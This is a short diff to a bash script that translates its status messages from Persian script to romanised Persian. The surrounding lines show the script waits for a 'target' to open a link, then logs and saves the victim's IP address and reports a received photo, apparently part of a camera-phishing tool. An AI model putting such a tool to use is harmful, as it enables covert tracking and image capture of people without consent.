@@ -56,7 +56,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] آی پی:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -66,12 +66,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] منتظر هدف ,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] MONTAZERE HADAF ,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] هدف لینک را باز کرد\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] HADAF LINK RA BAZ KARD!!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -80,7 +80,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] فایل عکس دریافت شد!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] AX GEREFTE SHOD\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
